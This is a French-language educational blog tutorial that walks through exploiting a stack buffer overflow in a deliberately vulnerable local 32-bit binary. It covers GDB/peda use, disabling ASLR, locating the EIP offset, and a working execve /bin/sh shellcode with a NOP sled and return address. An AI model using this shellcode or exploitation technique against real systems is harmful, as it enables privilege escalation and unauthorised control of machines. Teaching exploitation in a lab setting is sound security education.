---
title: "App-Sys: Sur les traces d'un buffer overflow"
slug: "app_sys_buffer_overflow"
date: 2019-03-22
description: "L'exploitation d'un buffer overflow, comment ça fonctionne ?"
---

## Prérequis
Avant de commencer, il est nécessaire d'avoir quelques bases en exploitation applicative système.\
Il faut donc connaître le fonctionnement du processeur, les registres, la structure d'un programme et surtout **le fonctionnement de la pile**.\
Pour cela, si ce n'est déjà fait, je vous invite à lire mon article "[Débuter progressivement](/cybersecu/app_sys_start_gradually)".

## Quel est le principe d'un "buffer overflow" ?

Avant de parler du "overflow", nous allons déjà parler du "buffer".\
Un "buffer" en programmation est une mémoire-tampon permettant de stocker temporairement des données (chaîne de caractères, un fichier...) avant d'être utilisées ou simplement copiée dans une autre zone mémoire. Par exemple, quand vous entrez du texte dans un programme, votre texte est placé temporairement dans un buffer (mémoire-tampon) et ensuite l'adresse du buffer peut être envoyée à une fonction d'impression pour l'afficher à l'écran.

![buffer](/img/buffer.jpg)

***Mais... c'est quoi ce truc à la fin de mon buffer ?***\
"\x00", ça ? **le null byte de fin de chaîne**, et le "\x" permet d'indiquer une valeur he**x**adécimale. Cet octet nul sert tout simplement à indiquer que c'est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s'arrêter de lire en mémoire. La fonction d'impression l'a utilisée pour afficher le texte "Julien" à l'écran. Sans ce caractère nul, la fonction serait incapable de savoir quand est la fin du texte et elle continuerait à lire la suite.

Et voilà..... Ah oui, j'ai failli oublier! Le "overflow" maintenant :)\
"Overflow" c'est le fait de déborder ce buffer et d'aller écrire en dehors de l'espace réservé à la base. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l'application !

![overflow](/img/overflow.jpg)

***Mais comment c'est possible ? Si on a une taille de 10, alors ça se bloque à 10. Non ?***\
Non, pas si le développeur a oublié de prendre en compte la taille du buffer. Il peut très bien demander un buffer de 10 caractères et autoriser à en écrire 20. Et là, on peut écraser 10 valeurs qui n'étaient pas réservées à notre buffer...

## Pourquoi exploiter un "buffer overflow" ?

Pour faire planter l'application !! Non, je plaisante ;)\
L'objectif c'est de dévier le flux d'exécution du programme et de pouvoir exécuter du code qui n'était pas prévu initialement. Il y a potentiellement pleins d'informations utiles après le buffer en question et le fait de pouvoir les réécrires peut amener à contrôler le registre d'instruction (vous savez, le fameux registre EIP).

***Je ferme l'application et j'exécute directement les commandes que je veux, pourquoi s'embêter ?***\
Parce que vous n'avez pas forcément les droits nécessaires :p Sur une machine, il y a des services qui peuvent tourner avec des privilèges élevés ou alors des binaires possédant le flag "suid" et là prendre le contrôle d'une telle application devient nettement plus intéressant.

Le flag "suid" pour "Set User ID", est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s'agit d'un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l'utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires et le flag "suid" peut être la solution.

![suid](/img/suid.jpg)

Pour vérifier si un fichier possède le bit "suid", il suffit simplement d'afficher les permissions du fichier et de regarder s'il ne possède pas la permission "s" à la place du "x". Si c'est le cas, alors le fichier sera exécuté avec les permissions du propriétaire. De plus, quand c'est le cas le nom du fichier apparaîtra sur fond rouge (comme sur ma capture, mais cela va dépendre de votre distribution).

Quelques exemples motivant un attaquant à exploiter un buffer overflow :

- Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d'exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d'obtenir un reverse shell (un shell inversé).
- Cette fois, l'attaquant à la main sur la machine mais ne possède pas les pleins pouvoirs. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d'obtenir un shell possédant les pleins pouvoirs.
- Maintenant aucun service n'est vulnérable et l'attaquant n'a pas la main sur la machine. Dans un premier temps, il va utiliser de l'ingénierie sociale (manipulation de l'être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l'un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique...) et l'attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).

Vous voyez qu'il y a un intérêt à exploiter un buffer overflow :) Let's go ??

## L'utilisation d'un débogueur

Avant de commencer à décortiquer notre programme, nous avons besoin d'un débogueur. Cette chose-là permet d'analyser les bugs d'un programme. Pour ça, il est capable d'exécuter le programme pas-à-pas (ligne par ligne), d'afficher la valeur des variables, de mettre des points d'arrêt à des endroits stratégiques du programme... Ça permet réellement d'analyser et contrôler l'exécution du programme souhaité et ainsi en comprendre son fonctionnement sans être en possession du code source.

Nous allons utliser **le débogueur GDB (GNU Debugger)** qui est le débogueur standard du projet GNU. Il fonctionne sur de nombreuses architectures de processeur, permet le débogage à distance (via une connexion série ou IP) et fonctionne sur de nombreux systèmes Unix.\
L'interface graphique ? une simple console :) Vous allez voir que c'est sympa (ce n'est pas de l'ironie) ! On va juste devoir rajouter un petit quelque chose sur GDB pour le rendre plus accueillant.

### Installation du débogueur

GDB est disponible dans la plupart des dépôts sous le nom de paquet "gdb". Commencez donc par l'installer :

```
# Debian
sudo apt-get install gdb

# CentOS
sudo yum install gdb
```

De base, GDB n'est pas très pratique à utiliser. Une commande doit être tapée à chaque fois pour suivre l'exécution du programme, visualiser les registres, la pile, aucune couleur permettant de mettre en évidence les relations, etc...

Mais heureusement, il existe des extensions à GDB permettant de rajouter toutes ces choses-là, des commandes supplémentaires et bien plus encore ! Ici, nous allons utiliser "peda" pour sa simplicité et son ergonomie. Si vous avez eu l'occasion de suivre mon premier tuto sur l'app-système alors "peda" vous dira quelque chose. Pour l'installer, rien de plus simple :

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

***Source : https://github.com/longld/peda***

Regardez comme il est mignon :)

![peda](/img/peda.jpg)

### Quelques commandes utiles

Pour commencer, toutes les commandes GDB possèdent une version longue et courte. Par exemple, ```info``` en version longue correspond à ```i``` en version courte, etc...

| Commande                                   | Version courte  | Description                                                                                                                                                                                              |
|--------------------------------------------|-----------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `run`                                  | r         | Démarrer le programme.                                                                                                                                                                                   |
| `info functions`                       | i fu      | Afficher la liste des fonctions.                                                                                                                                                                         |
| `break *0x... ou break *function_name` | b *0x...  | Pose un point d'arrêt à une ligne définie par son adresse ou au début d'une fonction.                                                                                                                    |
| `display/[quantité][type]x *0x...`     | x/...     | Affiche une zone mémoire à partir de son adresse ou du nom d'une fonction. Type : 'w' 32 bits, 'b' 8 bits...                                                                                             |
| `next [n]`                             | ni [n]    | Exécute [n] instruction(s). Par défaut, [n] est à 1. Vous pouvez donc faire "ni" directement.                                                                                                            |
| `step`                                 | si [n]    | Pareil que "next". La différence ici c'est qu'on entre dans les fonctions.                                                                                                                               |
| `disassemble [a]`                      | disas [a] | Désassembler une zone spécifique de la mémoire (affichage du code assembleur). [a] est l'une des adresses de cette zone ou le nom d'une fonction. Par défaut, [a] est la fonction exécutée actuellement. | 
| `info break`                           | i b       | Affiche la liste des points d'arrêt. | 
| `delete [n]`                           | d [n]     | Supprime le [n] point d'arrêt. Si pas de numéro, supprime la totalité des points d'arrêt. |
| `pattern_create [n]`                   |                 | Génère un schéma facilement reconnaissable en mémoire de [n] caractères. |
| `pattern_search`                       |                 | Recherche le schéma précédemment généré en mémoire. |

Pour avoir la liste complète des commandes, les différents types d'affichages, etc... c'est par ici :\
https://sourceware.org/gdb/onlinedocs/gdb/

***Tips : vous pouvez réexécuter la dernière commande exécutée en tapant simplement sur [Entrée].***

## Récupération d'un programme vulnérable

Je vous propose de télécharger un petit programme normalement vulnérable à un buffer overflow (on va vérifier ensemble). Ce programme vous demande simplement votre prénom et vous dit bonjour.\
Vous pouvez le télécharger [ici](/binary/overflow).

Je ne vous donne volontairement pas le code source tout simplement parce que dans une situation réelle, vous ne l'avez pas forcément :)\
En revanche, voici la commande qui a permis de compiler le programme :\
```
gcc overflow.c -o overflow -fno-stack-protector -z execstack -m32
```

Voici à quoi servent les différents arguments :

- -o **[fichier]** : place la sortie dans le fichier **[fichier]**
- -fno-stack-protector : permets de désactiver la protection de la pile. Dans les dernières versions de GDB, cette option est activée par défaut. Pour exploiter notre buffer overflow sur la pile, c'est mieux de la désactiver :)
- -z execstack : permets de rendre la pile exécutable. Vous allez comprendre pourquoi nous avons besoin de cette option par la suite.
- -m32 : permets de compiler le code source en 32 bits. Les adresses seront moins longues comme ça.

Maintenant nous pouvons lancer le programme pour le tester :

```
$ ./overflow 
Veuillez saisir votre prénom : Julien
Bonjour Julien

$
```

### J'ai une erreur... :(

Si ce n'est pas le cas, passez à la suite.\
Vous avez ce genre d'erreur ? :
```
$ ./overflow
bash: ./overflow: No such file or directory
```

Et pourtant vous avez vérifié à plusieurs reprises qu'il n'y avait pas d'erreur dans le nom du fichier et ce n'est pas le cas...\
On va arranger ça. Je pourrais parier que vous avez un OS en 64 bits, non ?\
Pour que votre OS puisse exécuter des binaires en 32 bits, il vous faut la bibliothèque standard C++ en version 32 bits. Pour l'obtenir, installez simplement ce paquet :

```
# Debian
sudo apt-get install lib32stdc++6

# CentOS
sudo yum install libstdc++.i686
```

Ça fonctionne ? Parfait, nous allons pouvoir passer à la suite.

### Vérifier la présence d'un buffer overflow

Pour tester la présence d'un buffer overflow, nous allons utiliser la technique des débutants. C'est-à-dire, envoyer beaucoup d'informations et essayer de provoquer un crash de l'application.

```
$ ./overflow 
Veuillez saisir votre prénom : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bonjour AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Segmentation fault (core dumped)
$
```

Ça vous voyez, c'est très bon signe ! Nous venons de déborder le buffer réservé pour notre prénom, nous sommes allés réécrire des données présentes après le buffer et l'application a crashée.

L'erreur **"Segmentation fault"** indique que l'application a tentée d'accéder à un emplacement mémoire qui ne lui était pas attribué. De ce fait, l'OS a inévitablement interrompu son exécution.


## Comprendre pourquoi l'application crash (phase d'analyse)

L'objectif ici c'est de comprendre pourquoi nous avons une erreur de segmentation, où et que pourrait-on en faire.


### Désactiver l'ASLR

Avant toutes choses, nous allons désactiver l'ASLR (Address Space Layout Randomization). C'est une protection de la mémoire appliquée par l'OS et qui permet de placer de façon aléatoire les zones de données dans la mémoire virtuelle. En général, les zones concernées sont le tas, la pile et les bibliothèques partagées. Si nous laissons cette protection en place, nous allons avoir du mal à exécuter un code arbitraire via le buffer overflow.\
Pour désactiver cette protection, rien de plus simple :

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

La désactivation n'est pas permanente. Au prochain redémarrage de votre machine, la protection sera à nouveau active.

### Dégainer GDB

C'est partie !!\
Pour charger notre programme dans GDB, il suffit simplement de faire :

```
$ gdb ./overflow
```

Normalement, GDB se lance et charge automatiquement l'extension peda. Vous devriez avoir un shell "```gdb-peda$```".\
Nous allons lister les fonctions présentes afin d'y voir plus clair :

![gdb_functions](/img/gdb_functions.jpg)

***Mais... il y en a beaucoup pour un simple programme !***\
Toutes les fonctions commençant par un underscore ou finissants par "@plt" ne sont souvent pas des fonctions développées par le développeur du programme. C'est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d'initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions "...register...clones" et "frame_dummy" peuvent également être ignorées.\
Bon allez, voici une commande permettant d'afficher uniquement les fonctions ne commençant pas par un underscore et ne possédant pas de "@" :

![gdb_functions_filter](/img/gdb_functions_filter.jpg)

La chose bizarre que j'ai rajoutée à la fin de la commande est une expression régulière. Elle permet d'appliquer un filtre sur le résultat.\
Il nous reste la fonction "interroger" et "main" (les autres ne sont pas concernées). Dans un programme, la fonction "main" est la fonction principale du programme. L'exécution du programme entraîne automatiquement l'appel à la fonction "main" et ceci dès le début.

Plaçons donc un point d'arrêt au début de la fonction "main" et "interroger" afin d'interrompre l'exécution :

```
gdb-peda$ b *main
Breakpoint 1 at 0x80484ba
gdb-peda$ b *interroger
Breakpoint 2 at 0x8048486
```

Avant de démarrer notre application, nous allons générer un pattern. C'est simplement une chaîne de caractères facilement reconnaissable en mémoire. Au moment d'entrer le prénom, nous allons entrer le pattern généré. Partons sur un pattern de 100 caractères :

![gdb_functions_filter](/img/gdb_pattern.jpg)

Copiez-le, il va nous servir au moment où il faudra entrer le prénom.

Vous êtes prêt pour le décollage ? Lançons l'application avec la commande ```r``` :

![gdb running](/img/gdb_running.jpg)

Le commandant de bord et l'ensemble de l'équipage ont le plaisir de vous accueillir à bord de **GDB**, compagnie membre de **GNU**.

Maintenant, nous allons suivre l'exécution du programme pas-à-pas et ceci jusqu'à un crash. La commande ```ni``` va nous permettre de faire avancer le pointeur d'exécution. À un moment donné, le programme va vous demander d'entrer votre prénom (juste après l'instruction ```call ...<fgets@plt>```), collez le pattern que vous avez copié précédemment :

![gdb pattern enter](/img/gdb_pattern_enter.jpg)

Vous avez un crash ? Moi aussi :

![gdb overflow crash](/img/gdb_overflow_crash.jpg)

"***Invalid $PC address: 0x......***", le programme a tenté de lire du code à une adresse invalide. Pour ma part, **0x41414641**.\
Maintenant remontez un peu plus haut dans GDB afin de voir quelle était l'instruction précédemment exécutée :

![gdb overflow crash](/img/gdb_overflow_ret.jpg)

Un schéma s'impose afin d'illustrer notre situation :

![overflow pattern](/img/overflow_pattern.jpg)

Vous voyez le souci ? Nous avons réécrit la sauvegarde de EIP servant à reprendre l'exécution de la fonction "main" et l'instruction "ret" l'a copiée dans le registre EIP. Le problème c'est que cette sauvegarde a été altérée par notre pattern et ne correspond pas à une adresse valide... du coup l'application a crashée.

![gdb overflow eip](/img/gdb_overflow_eip.jpg)

Maintenant il nous faudrait identifier à partir de combien de caractères nous atteignons cette sauvegarde afin de contrôler le registre EIP. Pour ça, la commande ```pattern_search``` va nous aider :

![gdb pattern search](/img/gdb_pattern_search.jpg)

C'est **à partir du 44ème caractère** que nous pouvons réécrire le registre EIP.

## Exploitation

Contrôler le flux d'exécution en modifiant le registre EIP c'est une chose, ouvrir un shell s'en est une autre... En effet, maintenant nous devons rediriger le flux d'exécution sur une zone mémoire possédant les instructions nécessaires à l'ouverture d'un shell. Comme ces instructions ne sont pas présentes en mémoire, nous allons donc nous en occuper :) Nous sommes capables d'écrire sur la pile (en entrant notre prénom), alors pourquoi ne pas écrire les instructions nécessaires dans le prénom (à la place du pattern) ?

### Le shellcode

Une suite d'instructions sous forme de chaîne de caractères est appelé un **shellcode**. À l'origine, un shellcode était destiné à ouvrir un shell. Avec le temps, le mot s'est généralisé et maintenant nous l'employons pour désigner tout code malveillant (pas seulement l'ouverture d'un shell). Vous vous souvenez de la notation "\x" pour écrire un caractère en hexadécimal ? Nous allons en avoir besoin pour notre shellcode.\
Je vous propose celui-ci :

`\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

Nous allons devoir utiliser un langage de programmation tel que Python pour interpréter notre shellcode. C'est-à-dire que chaque valeur hexadécimale va devoir être convertie en caractère. Par exemple, \x41 => "A".\
Tout d'abord, essayons de comprendre ce shellcode :

```
0:  83 c4 32                add    esp,0x32    ; esp = esp + 50
3:  31 c0                   xor    eax,eax     ; eax = 0
5:  50                      push   eax         ; pousse eax sur la pile
6:  68 2f 2f 73 68          push   0x68732f2f  ; pousse "//sh"
b:  68 2f 62 69 6e          push   0x6e69622f  ; pousse "/bin"
10: 89 e3                   mov    ebx,esp     ; adresse du haut de la pile dans ebx
12: 50                      push   eax         ; pousse eax
13: 53                      push   ebx         ; pousse ebx
14: 89 e1                   mov    ecx,esp     ; adresse du haut de la pile dans ecx
16: b0 0b                   mov    al,0xb      ; eax = 0xb (11) => id execve
18: cd 80                   int    0x80        ; déclenche un syscall (appel système)
```

***Le site qui m'a permis de convertir le shellode en assembleur est [defuse.ca](https://defuse.ca/online-x86-assembler.htm).\
Le shellcode a été trouvé sur [shell-storm.org](http://shell-storm.org/shellcode/).***

Ce code va donc effectuer l'appel système **execve** qui permet d'exécuter un programme (pour nous /bin/sh). En langage C, cela donnerait :

```
execve("/bin//sh", ["/bin//sh"]);
```

Les informations nécessaires pour réaliser un syscall peuvent être trouvées ici : https://w3challs.com/syscalls/?arch=x86

### Écriture de l'exploit

- Nous savons que pour écrire le registre EIP, il faut atteindre le **44ème caractère**.
- Nous avons en notre possession **un shellcode de 26 octets**.

Si nous plaçons notre shellcode au début de notre payload (charge qui va être injectée au moment de rentrer le prénom), alors il va falloir rajouter **18 caractères (44 - 26) pour atteindre l'adresse de retour**. Cette dernière va devoir pointer sur notre shellcode présent sur la pile.

Pour éviter d'avoir à mettre exactement l'adresse de notre shellcode, nous allons utiliser une petite astuce. Plutôt que de rajouter 18 caractères inutiles après notre shellcode (obligatoire pour atteindre l'adresse de retour), nous allons les utiliser à bons escients.\
On va rajouter 18 instructions "nop" (ne fait aucune action) avant notre shellcode. Comme ça, il nous suffira simplement de mettre une adresse tombant dans cette suite de "nop" et par la suite notre shellcode sera exécuté.

La valeur hexadécimale d'un nop est "\x90". Ce schéma illustre la forme de notre charge finale :

![overflow exploit](/img/overflow_exploit.jpg)

En Python, cela donnerait :

`
print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "pool_address"
`

Pour calculer l'adresse du pool, il suffit simplement de récupérer l'adresse du haut de la pile au moment du "ret" et d'enlever 44 (0x2c).

![overflow pool address](/img/overflow_pool_address.jpg)

Pour être tranquille, je ne vais pas prendre exactement le début du pool mais un peu après. Ma charge finale donne donc :

`
print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xf5\xc4\xff\xff"
`

Maintenant nous pouvons supprimer les breakpoints et relancer le programme en injectant notre charge en input. Pour faire cela avec GDB, il suffit de faire :

```
gdb-peda$ d
gdb-peda$ r < <(python -c 'print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xf5\xc4\xff\xff"')
```

![gdb run payload](/img/gdb_run_payload.jpg)

Félicitations à vous !

***Je n'ai pas compris pourquoi nous avions dû inverser l'ordre des octets pour l'adresse du pool...***\
Effectivement, je n'ai pas donné d'explication sur cette inversion. En informatique, il y a deux façons d'écrire une adresse et on appelle cela l'[endianness](https://fr.wikipedia.org/wiki/Endianness). Les architectures de processeurs utilisent l'une ou l'autre :

- Big endian : l'ordre des octets sont de gauche à droite (octets de poids fort au poids faible). Par exemple `0xA0B70708` => `A0 B7 07 08`.
- Little endian : l'ordre des octets sont de droite à gauche (octets de poids faible au poids fort). Par exemple `0xA0B70708` => `08 07 B7 A0`. C'est cet ordre qui est **utilisé par les architectures X86**.